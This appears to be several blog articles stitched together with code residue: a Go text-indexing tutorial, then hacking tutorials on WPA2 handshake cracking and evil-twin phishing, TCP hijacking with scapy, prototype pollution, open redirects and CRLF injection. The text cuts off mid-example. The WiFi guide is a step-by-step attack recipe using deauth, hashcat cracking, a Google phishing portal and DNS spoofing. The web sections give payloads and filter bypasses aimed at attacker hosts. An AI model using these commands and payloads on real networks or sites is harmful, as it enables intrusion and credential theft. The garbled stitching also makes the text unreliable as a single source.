Converting the processed text into tokens is a pretty straight forward process where you replace all special characters that you don’t want to include in the index to spaces (or any other special character(s) ) and splitting the text into different objects using the delimeter. Here’s a visualization of it:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XG3kC1kBFsNadvIGS55-gw.png)

Indexing
--------

Indexing is the process of taking the tokens generated in the last section and organizing them so that they can be found and searched easily. For numbers, the most basic form would be sorting them from the smallest to biggest number, for words, sorting them alphabetically. Generally, you would either create a custom way of indexing best suited for your project or use a database management system.

### Here are some ways you can index text:

*   **Tree structure:**

In a tree structure, the letters are in a branch-like structure which allows for blazing fast searches but can be a little too much for your RAM if you load everything at once, instead of loading the branches in chunks.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JfIq8tDWtUf2y2wnxLnohw.png)

*   **First characters**

Sometimes just the good old sorting by the first few characters might be the most effective and simple solution. Simply separate the words by joining them in with other words with the same few first characters. This could be done via for example putting every letter prefix to another file like hel.txt, wor.txt or you could use a dictionary data structure in your programming language of choice to store the data. JSON is also an option:

\`\`\`
{
  "hel": ["hello", "hell", "helsinki", "helmet"],
  "wor": ["world", "wordle", "worm", "worry"]
}
\`\`\`

Searching
---------

*   Linear search

This is the most basic form of searching, just iterating through the entire list/file/whatever area and search for something in there. Example:

\`\`\`
array = ["this", "is", "some", "text"]
for item in array:
    if item == "some":
        print(item)
\`\`\`

*   **Binary search**

The idea behind binary search is that if you have a list with ascending values (for example, numbers 1–100 or characters a-z), you can get the number of values that are in the list, divide it by 2, check the value and if it’s greater than the value we’re trying to find we repeat the process but this time with the first half of the list. Note that sometimes it’s useful to add some tolerance by iterating for example, the last 10 possibilities if we also wanted to get similar words/items.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uSTt4cwzzqULmekCF025tA.png)

Golang implementation examples
------------------------------

Golang is good for RAM and overall resource-heavy projects where you need to squeeze the most out of your system, but also want memory safety, so I recommend using it for data processing projects.

### Tokenization

\`\`\`
package main
import (
 "fmt"
 "regexp"
 "strings"
)
func main() {
 //Text that we're gonna tokenize
 text := "Hello there! Do you like the computer you're using?"
 //Convert to lowercase
 step1 := strings.ToLower(text)
 //Convert special characters to spaces
 step2 := regexp.MustCompile(\`[^a-zA-Z0-9' ]+\`).ReplaceAllString(step1, " ")
 //Separate words using a space as a delimeter
 step3 := strings.Split(step2, " ")
 //Remove common words
 commonWords := []string{"the", "a", "in", "on", "if", "at", "is"}
 var step4 []string
 for _, word := range step3 {
  if !Contains(commonWords, word) && len(word) > 1 {
   step4 = append(step4, word)
  }
 }
 //Map the words to their relative location
 mapping := make(map[string][]int)
 for indx, word := range step4 {
  mapping[word] = append(mapping[word], indx)
 }
 //Display the final mapping
 fmt.Println(mapping)
}
func Contains(list []string, word string) bool {
 for _, value := range list {
  if value == word {
   return true
  }
 }
 return false
}
\`\`\`

### Indexing

\`\`\`
package main
import (
 "log"
 badger "github.com/dgraph-io/badger/v4"
)
func main() {
  //tokenization here
  //...
  //...
  index(mapping)
}
func index(mapping map[string]int) {
  //Database initialization (documentation at https://dgraph.io/docs/badger/get-started/)
  db, err := badger.Open(badger.DefaultOptions("./database"))
  if err != nil {
   log.Fatal(err)
  }
  defer db.Close()
  txn := db.NewTransaction(true)
  if err != nil {
    log.Fatal(err)
  }
  ////
  //Iterate the map and store the words in a database
  for key, val := range mapping {
    var locations string
    for _, indx := range val {
      locations += strconv.Itoa(indx) + "|"
    }
    txn.Set([]byte(key), []byte(locations))
  }
  ////
  //Commit the changes
  if err := txn.Commit(); err != nil {
    log.Fatal(err)
  }
  ////
}
\`\`\``,ve=`Hacking WIFI devices and networks
=================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wSrnqBRMPL-TVWXtxTbKGA.png)




Intro
-----

In this article, I’m going to guide you through hacking WIFI access points and WIFI-enabled devices. Please note that for you to be able to follow the guide fully, you need a wireless card capable of packet injection that supports monitor mode. If you aren’t sure if your card supports monitor mode or not, you can test it like this:

\`\`\`
iwconfig #Check what your wireless card interface name is
airmon-ng start interface_name_here 
#If the command works, your wireless card supports monitoring mode.
\`\`\`

All the current WIFI security protocols
---------------------------------------

### WEP

WEP is the first ever WIFI security protocol, which was introduced in the late 1990s. In today’s world, it is as good as nothing in terms of security, since there have been many critical vulnerability discoveries and the password itself is very easy to crack too.

### WPA2

This is the most popular security protocol today, with almost every wireless network using WPA2 personal or enterprise. Since WPA2 is the current standard, we are basically only going to focus on hacking this one.

### WPA3

WPA3 is the newest protocol, and it was introduced in 2018. Because it is so new, it hasn’t been tested thoroughly enough yet and probably has a lot of security vulnerabilities to patch before it is going to be implemented on home networks by default.

Concepts Explained
------------------

### Deauth/Deauthentication

The IEEE 802.11 (WIFI) protocol has a packet known as the WIFI deauthetication frame, which is used by the client or access point to let the other party know that the connection is closed and to stop sending data.

This is a flawed system though, since the deauth packet origin can be spoofed. This means we as attackers can send a spoofed deauth packet to either the client or the access point, pretending to be the other device, with the impact of this attack being that the target is gonna lose the connection to the access point by either the access point or client closing the connection to the other device, thinking the other device wanted to disconnect.

### Monitoring mode

Monitor mode is a wireless card feature that allows the card to capture and analyze wireless network traffic without being connected to any particular network.

### Captive portal

A captive portal is a page that a wireless router redirects users to if they try browsing the web (or it pops up automatically). Captive portals are usually used in free WIFIs to make the user register an account on the network to prevent abuse, but this too can be exploited by setting up a rogue captive portal on a fake WIFI network that tricks the user into, for example, logging into their “Google account”, which in reality is just a phishing site hosted on the attacker’s computer.

Hacking WIFI (the exciting part)
--------------------------------

In this section, I’m going to cover two of the best attacks you can perform on access points and WIFI-enabled devices.

### Cracking WIFI handshakes

When a device connects to a password-protected wireless network, the network and device go through a 4-way handshake, which tries to create an encrypted communication line with the wireless router, which also validates the password. If we capture this handshake taking place fully, we’ll have enough information to try crack the wireless network password locally. Here’s a very good in depth explanation if you’re interested: [https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake](https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake)

To capture the 4-way handshake we can either wait for someone to connect to the target network or my preferred way, do a deauth attack on a device connected to the network and then wait a few seconds for the device to automatically rejoin (this is what we’re going to do).

**Let’s begin!**

**1. Enable monitoring mode**

\`\`\`
airmon-ng start <interface>
\`\`\`![The output should say “monitor mode enabled”](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NaTesSzhLfiZblVRRXOrFw.png)

**2. Discover your target**

Run the following command to sniff what APs (Access Points) and WiFi-enabled devices are around you:

\`\`\`
airodump-ng <interface>
\`\`\`

Once you’ve selected your target, look at the “CH” column. This tells us what channel/frequency the target network operates at. Stop the scan with CTRL + c.

Fun fact: if the CH > 100, the network is 5G.

**3. Change your channel**

Wireless adapters cannot usually listen on multiple channels at the same time, but we need to be on the same channel as the target for our attacks to be effective, so change your wireless card channel to the target’s like this:

\`\`\`
iw <interface> set channel <target_channel>
\`\`\`

**4. Start sniffing**

Now start airodump-ng once more, but this time to save the handshake.

\`\`\`
airodump-ng -c <target_channel> -w <where_to_save_handshake_cap> <interface>
\`\`\`

**5. Deauth**

Once airodump-ng is started, start the deauth attack to disconnect the network’s clients. There are many tools for this, but my favorite one is mdk4.

\`\`\`
mdk4 <interface> d -E <target_ESSID (name)> -c <target_channel>
\`\`\`

When you see output like “sending packet”, wait for about 5 seconds for the tool to do its thing, and then CTRL + c to stop the deauth. Now you just wait; if you had good luck, this worked on the first try and you should see “captured handshake: bla bla bla” at the top right corner of airodump-ng at which point you can close airodump-ng too. If you have waited like 10 secs without any handshakes, do the deauth again, and repeat it until you get a handshake.

**6. Crack the handshake**

Congrats! You now have a captured handshake in the *.cap file. It is now time to crack it. You have a couple of different ways to do this. The first is using aircrack-ng and the second is using hashcat. It doesn’t really matter which one you use; hashcat just takes a little more effort to work with.

Cracking with aircrack-ng (examples):

\`\`\`
#Method 1: Crack with dictionary
aircrack-ng <path_to_cap_file> -w <wordlist_file> 
#Method 2: Pipe a wordlist to aircrack-ng
crunch 8 8 0123456789 |aircrack-ng <path_to_cap_file>
\`\`\`

Cracking with hashcat (example):

\`\`\`
#First convert the cap file to hashcat format
aircrack-ng -j <path_to_save_HCCAPX_file> <path_to_cap_file>
#Try crack the WIFI password assuming it's an 8 length PIN
hashcat -a 3 -m 22000 <path_to_save_HCCAPX_file> ?d?d?d?d?d?d?d?d
\`\`\`

**7. Finish line**

You should now have the clear text cracked password. Go ahead and connect to the network or do whatever you want with it.

### Creating an evil twin (EVIL TWIN Attack)

When you set your phone or other device to “remember” a network, what that does is make the device send probe requests, which are like the device constantly asking around, “Hello, is a network with the name XXX here?” and if the network is in reach, it will respond saying, “Yeah I’m here, look at my ESSID (network name)” and the phone will connect to it.

If the saved network isn’t password protected, we can do something called an evil twin attack, which basically means we listen for those probe requests, then we create an identical network ourselves, tricking the device into connecting to us. If the target is already connected to a network, we can keep deauthing the device off of the network so that it automatically connects to the second-best option, which is most likely our fake network.

This alone wouldn’t be much worse than a DOS attack, but when coupled with something like a captive portal and/or DNS spoofing, this becomes a really powerful attack.

**1. Download create_ap**

Create_ap is a very easy-to-use program for Linux to set up access points. It’s not maintained anymore but still works smoothly; I’ve never had a problem with it.

Install it by copy pasting these lines:

\`\`\`
git clone https://github.com/oblique/create_ap
cd create_ap
make install
\`\`\`

**2. Discover the target device**

\`\`\`
airodump-ng <interface>
\`\`\`

Look at the bottom “probes” section. This contains all the WiFi networks requested/probed by each device.

Now just decide which device you want to attack and which of the WiFi networks you are going to create. Next look at the “BSSID” section of the device you’re targeting. “(not associated)” means the device is not currently connected to a network, and you can skip the next step. However, if you see a MAC address there, it means you have to deauth it.

**3. Deauth (only if target is connected to another WIFI)**

To get the channel information and ESSID, find the BSSID the device is connected to from the BSSID list in the upper part of airodump. BTW, “station” means the same as MAC address of the target device (like a phone)

Now close airodump-ng and run:

\`\`\`
iw <interface> set channel <target_channel>
mdk4 <interface> d -E <ap_name> -c <target_channel> -S <device_mac>
\`\`\`

Leave that in the background and continue with the rest of the guide.

**4. Create the rogue access point**

\`\`\`
create_ap -n <interface> <ap_name>
\`\`\`

“-n” means it will not receive an internet connection. It can only connect to the attacker’s computer, which would be the wireless router for the target device. AP_name is the ESSID you found a device was asking for in step 2.

**5. Spin up a phishing site**

Now you have to decide what site do you want to serve as a captive portal. You can use any tool you want or create one yourself, but for the sake of simplicity, I’m going to use a tool called “HiddenEye” ([https://github.com/Morsmalleo/HiddenEye_Legacy](https://github.com/Morsmalleo/HiddenEye_Legacy)) to start a Google phishing site at port 80. To do that, just install the tool, run it, and select the Google standard phishing page, but change the listening host and port to 0.0.0.0:80. If you want, you can also set up a HTTPS listener in case the target tries to go to a HTTPS website.

**6. DNS Spoofing**

This is the part that is going to transform just the computer with a webserver into an actual captive portal. How this works is that every time the target tries to go to a website like helloworld.com, our computer is will send a spoofed DNS reply saying, “yeah, I know where helloworld.com is; it’s at <insert our own ip>” sending the user to our phishing page instead of the real website.

First, you need to know what your IP is in the newly created WiFi network. To find it, run:

\`\`\`
ifconfig
# OR
ip a
\`\`\`

Your IP should be listed under the “tun” interface.

For the spoofing, I prefer using a tool called ettercap-gui. It’s a quite old program, but still, in my opinion, the most capable of all of them. To get started, open up the ettercap dns file at _/etc/ettercap/etter.dns_ and add this line:

\`\`\`
* A <your_ip_here>
\`\`\`

Save the file and open up ettercap in gui mode. Then navigate to plugins, manage plugins, and activate the dns_spoof plugin.

**7. Finish line**

That’s it! Now that the device should be connected to the fake network, the next time the user tries to go on some website, it should pop up with the captive portal we wanted to serve.

Hope this article helped you ❤
------------------------------`,ye=`TCP Connection hijacking deep dive
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cb2h86_X4XiIk44sejOMBw.png)


Introduction
------------

It is a widely known fact that unencrypted TCP/IP connections can be snooped and intercepted, but what some may not know is that it is possible to completely hijack a TCP connection and act as if you were the actual client without the server even realizing, that you have taken control of the connection.

How TCP works
-------------

When establishing a TCP connection, the devices go through a “3-way handshake,” which ensures both devices want to connect. During the handshake, the devices share connection settings between them, like what the initial SEQ and ACK values are, what window size should be used, etc. When the 3-way handshake is done, the devices are free to send custom data back and forth.

### 3-Way Handshake

A TCP 3-Way Handshake, as the name suggests, consists of 3 steps/parts: SYN, SYN-ACK and ACK.

**Step 1 (SYN):** The client that wants to connect to the server sends a SYN packet, which is like a computer way of saying, “Hey, is this port <port here> available? Can I connect?”. Another important thing in this step is that the initial SEQ number is set.

**Step 2 (SYN-ACK):** If the port is open and the server is willing to accept the connection, the server sends a SYN-ACK packet. The server now changes the SEQ number given by the client, sets it as the response packet ACK NUMBER, and adds +1 to it. It also generates the initial ACK number, which it sets as the response SEQ number.

**Step 3 (ACK):** The client responds back to the server confirming that it has received the SYN-ACK packet, switches SEQ with ACK and ACK with SEQ number and adds 1 to the new switched-out ACK value.

Here’s a visualization of how it works:

![captionless image](https://miro.medium.com/v2/resize:fit:1102/format:webp/0*ODkq39K8rIWyVc_3.png)

### SEQ and ACK numbers

To ensure reliability and some security, TCP uses SEQ and ACK values to keep track of the amount of packets and data sent. If these numbers don’t match up on the receiving side, TCP drops the packets because something might’ve malfunctioned and the last packet didn’t make it to the other device, or something else happened that caused the devices to not be on the same page on what data was sent between them.

Here’s a demonstration of how the SEQ and ACK values are used.

![captionless image](https://miro.medium.com/v2/resize:fit:1124/format:webp/1*tJ8YBBPbZ0IR82ChDydzpQ.png)

(read picture from top to down)

1.  The first three packets complete the 3-way handshake.
2.  The client sends data to the server with the SEQ and ACK values of the last ACK packet switched up (sent by the client himself).
3.  The server receives data (6 bytes of it), replaces the ACK with SEQ and vice versa, adds length of the payload (6) to the new ACK value and responds.
4.  The client sends data to the server with the SEQ and ACK values of the last ACK packet but switched up (sent by the server).
5.  Repeat the logic in the past steps for the rest of the packets.

_Note that in real life, the SEQ and ACK values are VERY large, like starting at >1000000000._

TCP Hijacking
-------------

### Why does TCP hijacking work?

TCP hijacking relies on being able to calculate the SEQ and ACK values for the next packet that the real target would send. Like we saw in the previous section, those values can be calculated if we have a single PSH-ACK or ACK packet from either the client or server. If we can’t calculate the new values, TCP hijacking is not going to work since the server will just ignore our packets.

To get the packet used to calculate the spoofed values, we need to monitor the network traffic from either the server, the client, or the connection between them. This could be achieved with ARP spoofing or running a packet program capture on either device.

### Creating the spoofed packet

When we get the packet, here’s how the values would be calculated from the PSH-ACK and ACK packet(s):

**PSH-ACK:**

new SEQ = old ACK

new ACK = old SEQ + length(data in old packet)

**ACK:**

new SEQ = old ACK

new ACK = old SEQ

**Now that we have the values, it is as simple as creating a packet with scapy (or another packet crafting tool), with the calculated SEQ and ACK numbers included and sending it to the server. Here’s an example Python script:**

\`\`\`
from scapy.all import *
ip_layer = IP(src="192.168.233.20", dst="192.168.233.15") 
#233.20 is target and 233.15 the server
tcp_layer = TCP(sport=52831, dport=1234, flags="PA", seq=159200301, ack=69235779)
#server port is 1234
packet = ip_layer/tcp_layer
send(packet)
\`\`\`

Automating TCP hijacking
------------------------

As you may now realize, doing TCP hijacking by hand would be extremely impractical, so in reality, the only viable way of exploiting this would be by using an automated script. I tried to find a good TCP hijacking general-purpose tools online but couldn’t find any, so I coded one myself.

### https://github.com/Varppi/harmony

Mitigation
----------

TCP hijacking can be mitigated by encrypting the client-server communication or by using some other kind of custom application layer security check.`,be=`Server-side prototype pollution
===============================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZaMrNIQsg6QzuWKUG4ogSg.png)


Introduction
------------

In this article, I’m going to cover what prototype pollution is, what causes it, how to exploit it, and how to fix it.

Explaining prototypes
---------------------

In JavaScript, prototypes are used to inherit properties from another object.

Think of for example airplanes. Every plane can fly, but there are subcategories of planes like a cargo plane that is obviously still a plane, but designed for more than simply fitting the description “a plane”. You could think of it as the cargo plane inheriting plane features, but it also has the added feature of being able to hold cargo.

Here’s a basic coding example of how inheriting works:

\`\`\`
var a = {
  x: "Hello",
  y: "Welcome"
}
var b = Object.create(a)

\`\`\`

So in the above example, b will inherit the variables x and y from the variable a. These variables will be included in the prototype of b so they can then be used.

![captionless image](https://miro.medium.com/v2/resize:fit:840/format:webp/1*6qBv1xgNMpzszWknuuQVdg.png)

Here’s a visualization of inheritance:

![captionless image](https://miro.medium.com/v2/resize:fit:748/format:webp/1*8a5Hllc2_7pOQpQJ6sofCQ.png)

[https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes)

Prototype pollution
-------------------

Prototype pollution happens when a server unsafely merges user controlled properties to an existing object, allowing an attacker to modify the \`__proto__\` variable. This alone usually won’t compromise a system, but if the object the polluted object is getting merged into contains juicy variables like \`isAdmin\` and the server lacks robust server side validation, it quickly turns into a critical vulnerability since now the attacker can make the object inherit a custom value for that sensitive variable.

Note that prototype pollution can be both server and client side. On the client side prototype pollution usually leads to XSS while server side can lead to many different vulnerabilities.

Detection
---------

Detecting a prototype pollution vulnerability is usually the hardest part and can easily lead to the server malfunctioning or even crashing if not careful, but thankfully Portswigger has released an article on some tricks to detecting the vulnerability without breaking things (here’s the full article: [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)).

To set the scene, let’s say that we’re doing a black box test on a company, and this is the login HTTP request for their main site:

\`\`\`
POST / HTTP/1.1
Host: customers.company.com
Accept: application/json
Content-Type: application/json
Content-Length: 52
{
  "username": "marcus",
  "password": "s3cure;)"
}
\`\`\`

1.  If the server uses the “body-parser” module, you can UTF-7 encode the post data, inject a custom charset variable, and see if the server responds differently with and without UTF-7 encoding. If it does, it means the server is probably vulnerable! You can use [https://cyberchef.org](https://cyberchef.org) to encode your payload.

\`\`\`
POST / HTTP/1.1
Host: customers.company.com
Accept: application/json
Content-Type: application/json
Content-Length: 129
{
  "username": "marcus",
  "password": "s3cure+ADs-)",
  "__proto__": {
     "content-type": "application/json; charset=utf-7"
  }
}
\`\`\`

2. If the server is using the “CORS” library, you can use the \`exposedHeaders\` variable to make the server reflect a custom header back to you.

\`\`\`
POST / HTTP/1.1
Host: customers.company.com
Accept: application/json
Content-Type: application/json
Content-Length: 106
{
  "username": "marcus",
  "password": "s3cure;)",
  "__proto__": {
    "exposedHeaders": ["polluted"]
  }
}
\`\`\`

If the server is vulnerable and everything goes according to plan, the server should respond with the custom header set:

\`\`\`
HTTP/1.1 200 OK
Access-Control-Expose-Headers: polluted
{}
\`\`\`

3. Set a custom HTTP status. If the server response has the same status code as your payload, it is vulnerable.

\`\`\`
POST / HTTP/1.1
Host: customers.company.com
Accept: application/json
Content-Type: application/json
Content-Length: 89
{
  "username": "marcus",
  "password": "s3cure;)",
  "__proto__": {
    "status": 269
  }
}
\`\`\`

Exploitation
------------

To make use of prototype pollution, you have to discover what variable(s) you want to pollute. This could be done by enumerating the site’s APIs that are related to the vulnerable endpoint and trying to find juicy properties in the **_API responses_** like \`"account_balance": 27\` . When you’ve found a good target, all that’s left is crafting a payload.

Using the example in the detection section, we could use the following payload to potentially get admin privileges:

\`\`\`
POST / HTTP/1.1
Host: customers.company.com
Accept: application/json
Content-Type: application/json
Content-Length: 91
{
  "username": "marcus",
  "password": "s3cure;)",
  "__proto__": {
    "isAdmin": true
  }
}
\`\`\`

I highly recommend trying what you learned by doing the Portswigger Academy labs on this subject (THEY ARE FREE): [https://portswigger.net/web-security/prototype-pollution/server-side](https://portswigger.net/web-security/prototype-pollution/server-side)

### You can use the Burp Suite “Server-Side Prototype Pollution Scanner” extension to automate detecting prototype pollution to a point.

Mitigations
-----------

1.  Use \`Object.freeze(Object.prototype);\` to disable the editing of the prototype variable.
2.  Use a whitelist of properties to merge.
3.  Consider using a Map instead of merging.

Full list of mitigations: [https://portswigger.net/web-security/prototype-pollution/preventing](https://portswigger.net/web-security/prototype-pollution/preventing)

Thx 4 reading ❤
---------------`,xe=`Explaining and exploiting open redirect vulnerabilities
=======================================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ZslMcu4APoq7xCgOEueXA.png)

Introduction
------------

In this article, I’m going to cover what an open redirect vulnerability is, how to discover and exploit it, and some common defense evasion tactics. If you have any corrections or better information, do share them in the comments.

What is an open redirect vulnerability?
---------------------------------------

Open redirect vulnerability occurs when a flaw in the client- or server-side website code allows an attacker to use the legitimate website to redirect a user to an attacker-controlled website, essentially exploiting the trust the user has in the website. This is then usually used in email phishing campaigns to gain trust.

Open redirect may be confused with, but is different from SSRF (Server Side Request Forgery), since in SSRF an attacker tricks the **server** into requesting a website, but in open redirect, an attacker tricks the server or victim browser into redirecting the victim from the legitimate website to a potentially malicious website hosted by the attacker.

Exploitation in practice
------------------------

### Discovery

What you usually want to look out for are URL parameters that look like a path or a URL. Here are some examples of the types of parameters I’ve found open redirects in the wild:

\`\`\`
https://site.com/login?ReturnURL=https%3A%2F%2Fsite.com%2Fmy-account
https://site.com/form-complete?return=%2Fcompleted
https://site.com/api/v2/redirect?url=https%3A%2F%2Fsite.com%2F404
\`\`\`

If you can’t find any parameters, you might want to try finding hidden ones by fuzzing the parameters with a tool like \`ffuf\` . Sometimes dangerous parameters and endpoints are left exposed either accidentally or because the developers forget to remove them from the production environment.

As a parameter fuzz wordlist, I would suggest using burp-parameter-names.txt. If you have seclists installed you can find it in _/usr/share/seclists/Discovery/Web-Conten_t. On Kali, you can install it with:

\`apt install seclists\`

or download it from Github: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists).

### Exploitation

If the parameter includes a URL like \`https%3A%2F%2Fsite.com%2Fmy-account\` , try changing the URL, and if it works, great; you just found an open redirect vulnerability! If it doesn’t, try the method below or the defense evasions.

If the parameter looks like a path: \`%2Fcompleted\` , replace it with a URL. If that doesn’t trigger a redirect, you can abuse the \`[http://username:password@site.com](http://username:password@site.com) or username@site.com\` authentication syntax that browsers support to your advantage. So let’s say this is what happens when you go to the URL with the redirect parameter:
1. The server receives the HTTP request.

2. The server parses the HTTP parameter.

3. The server adds the parameter value to the end of the main website URL and redirects the user to it:

\`\`\`
app.get('/form-complete', (req, res) => {
    var redirectPath = req.query.return;
    res.redirect('https://site.com'+redirectPath)
});
\`\`\`

Now coming back to the authentication syntax, we can add \`@attacker-website.com\` as the return parameter.

This would result in the user getting redirected to [https://site.com@attacker-website.com.](https://site.com@attacker-website.com.) The browser would now try to log into the site attacker-website.com and use “site.com” as a username.

\`\`\`
GET /form-complete?return=%40attacker-website.com HTTP/1.1
Host: site.com
Accept: application/json
↓
HTTP/1.1 200 OK
Location: https://site.com@attacker-website.com
↓
GET / HTTP/1.1
Host: attacker-website.com
Accept: application/json
↓
<attacker phishing website>
\`\`\`

Common defense evasions
-----------------------

### Includes domain

If the website has a function that checks if the website domain is included in the URL, you can bypass this by giving it as an argument to your own website like this:

\`\`\`
https://site.com/login?return=https%3A%2F%2Fattacker-website.com%2F%3Ffoo%3Dsite.com
Payload: https://attacker-website.com/?foo=site.com
\`\`\`

### Starts with domain

If the site checks if the return URL starts with the domain, you can bypass it by using the same authentication trick as shown in the exploitation section:

\`\`\`
https://site.com/login?return=https%3A%2F%2Fsite.com%40attacker-website.com
Payload: https://site.com@attacker-website.com
\`\`\`

### Blacklist

The website may also blacklist the keywords \`https://\` and \`http://\` . If this is improperly implemented by matching the whole string \`http://\` instead of \`http\`, the filter can be bypassed by putting in a third slash in the beginning:

\`\`\`
https://site.com/login?return=https%3A%2F%2F%2Fattacker-website.com
Payload:https:///attacker-website.com
              ↑ Notice the third "/" character
\`\`\`

Mitigation
----------

1.  Avoid using return/redirect parameters and use hardcoded URLs instead.
2.  Prefix the URL with / like this:

\`\`\`
Better: "https://site.com/" + path
Bad: "https://site.com" + path
\`\`\`

3. Use strict validation with regex or some other way.

\`\`\`
const re = /[\\w+/+\\.]/;
const matches = re.exec(req.query.return);
if (matches) {
  /*Redirect*/
} else {
  /*Doesn't redirect*/
}
\`\`\`

Some tips
---------

*   To test open redirect in practice, you can use https://webhook.site to test your payload.
*   Burp has an extension for this: [https://portswigger.net/support/using-burp-to-test-for-open-redirections](https://portswigger.net/support/using-burp-to-test-for-open-redirections)
*   URL shorteners help make the redirect URL less suspicious.

Thank you for reading :) ❤
--------------------------`,Se=`CRLF injection
==============

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dGbIt8jpAck_zx75CoE9jw.png)


Introduction
------------

In all the operating systems that I know, CR (carriage return) and LF (line feed) characters are used to separate lines in text. For example, if you were to inspect this HTTP request at the byte level:

\`\`\`
GET / HTTP/1.1
Host: site.com
Accept: application/json
\`\`\`

You would see that all the lines end with these two hex characters: \`0D 0A\` . Programmers may also know them as \`\\r\` (CR) and \`\\n\` (LF).

CRLF injection includes many subcategories that describe CRLF injection in a specific place, but they’re still all different types of CRLF injections. These include:

*   header-splitting attack
*   HTTP header injection
*   email injection
*   log injection

there are probably many more of these subcategories.

In the following sections, I’m going to explain how you can exploit these two cute characters to get bounties and secure your own servers against them.

CRLF injection
--------------

Normally CRLF characters are benign, like in a feedback text box where multiple lines are needed, but a problem arises when user input containing CRLF is blindly trusted and used in a server-side function where CRLF characters were not expected. If this happens, it might be possible for an attacker to do a number of attacks, including:

*   reflected XSS
*   HTTP request smuggling
*   email injection
*   log injection

Basically, all functions that use newlines as a delimiter are vulnerable if input is not sanitized.

Discovery
---------

To find a CRLF vulnerability, you want to logically think about where in the web application user input would be:

*   reflected as a header (cookies, redirects)
*   included in a file (logs)
*   included in a server-side request (email, server side HTTP request)

To include a CRLF in a URL parameter, use these URL encoded values:

*   Carriage return: \`%0d\`
*   Line feed: \`%0a\`

Exploitation
------------

### Exploiting automatic directory completion

The most common place I’ve found CRLF injection is when you request a website directory without a leading “/” and the website redirects you to a URL with a leading “/” like this:

\`\`\`
GET /helloworld <-- no slash HTTP/1.1
Host: site.com
Accept: application/json
↓
HTTP/1.1 301 Moved Permanently
Location: /hello-world/ <-- slash
\`\`\`

We can use CRLF to inject a custom header like so:

\`\`\`
GET /helloworld%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1
Host: site.com
Accept: application/json
↓
HTTP/1.1 302 Found
Location: /hello-world
Location: https://hacker-site.com/
\`\`\`

**Payload:** \`**/helloworld<CRLF>Location: https://hacker-site.com**\`

Now any user that clicks that URL will be redirected to an attacker server instead of /hello-world.

### Exploiting redirections

Another common place where I’ve found these are redirects. It is a great day when you find an open redirect vulnerability and CRLF injection from the same endpoint.

Here we have an API that redirects you to another website using the \`Location:\` header:

\`\`\`
GET /api/redirect?url=https%3A%2F%2Fsite.com%2Fhello-word HTTP/1.1
Host: site.com
Accept: application/json
↓
HTTP/1.1 302 Found
Location: https://site.com/hello-world
\`\`\`

Then we can inject a custom location header into the URL parameter:

\`\`\`
GET /api/redirect?url=%2Fhello-world%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1
Host: site.com                       ↑ CRLF
Accept: application/json
↓
HTTP/1.1 302 Found
Location: /hello-world
Location: https://hacker-site.com/
\`\`\`

**Payload:** \`**/hello-world<CRLF>Location: https://hacker-site.com**\`

Once again, the user has been redirected to the hacker’s website!

### Email injection

If user input that is passed into an email or its headers isn’t validated and sanitized properly, it’s possible to use CRLF to inject custom headers into the email headers.

Here’s a PHP script that is vulnerable to email injection:

\`\`\`
<?php
$name = $_POST['name'];
$replyto = $_POST['replyTo'];
$message = $_POST['message'];
$to = 'root@localhost';
$subject = 'Random subject';
$headers = "From: $name \\n" .
"Reply-To: $replyto";
mail($to, $subject, $message, $headers);
?>
\`\`\`

How the feedback was meant to be used:

\`\`\`
POST /feedback.php HTTP/1.1
Host: site.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
name=peter&replyTo=peter%40serious.bznes&message=Serious%20message.
\`\`\`

To begin exploiting this, let’s take a look at what headers we could inject: [https://www.rfc-editor.org/rfc/rfc4021.html](https://www.rfc-editor.org/rfc/rfc4021.html#section-2.1.7) . A very juicy one that I found is “Bcc”, it’s a header used to specify multiple email recipients. A perfect candidate for this exploit!

Here are the current email headers:

\`\`\`
From: peter
Reply-To: peter@serious.bznes
\`\`\`

Let’s inject a Bcc header into the “name” parameter:

\`\`\`
POST /feedback.php HTTP/1.1
Host: site.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
name=peter%0d%0aBcc%3A%20notaniceguy%40company.com&replyTo=peter%40serious.bznes&message=You're%20not%20a%20nice%20guy%20%3A(
\`\`\`

**Payload:** \`**peter<CRLF>Bcc:notaniceguy@company.com**\`

Now the email headers look like this:

\`\`\`
From: peter
Bcc:notaniceguy@company.com
Reply-To: peter@serious.bznes
\`\`\`

By all logic, the feedback message should’ve gone to both the admin of the site and notaniceguy@company.com.

### Log injection

In log injection, an attacker can inject custom messages into logs by using the CRLF characters. This could be done to raise false alarms and make the server administrators waste their time on bogus alerts.

Let’s say someone at the company has created his very own logging framework that puts all login attempts into logins.log in this format:

\`\`\`
<time>:<user>:<correct credentials?>
1708853728374:peter:False
1708853743574:peter:True
\`\`\`

We could enter this as a username to trick the admin into believing his account was logged into at a specific time:

\`\`\`
peter:False%0d%0a1708853860227:admin:True
\`\`\`

This is what the logs would look like after the injection (without the dashes ofc):

\`\`\`
1708853728374:peter:False
1708853743574:peter:True
_________________________
1708853860027:peter:False|---> OUR PAYLOAD
1708853860227:admin:True |
-------------------------
\`\`\`

### Reflected XSS

Some sites may add a cookie to the browser based on user input. An example of this would be taking in the parameter “?language=en-US” and then storing it as a cookie (in a HTTP response, not in JS). If no sanitization is done, this could leave the user open to XSS.

\`\`\`
GET /language?lang=en-US HTTP/1.1
Host: site.com
Accept: text/html
↓
HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
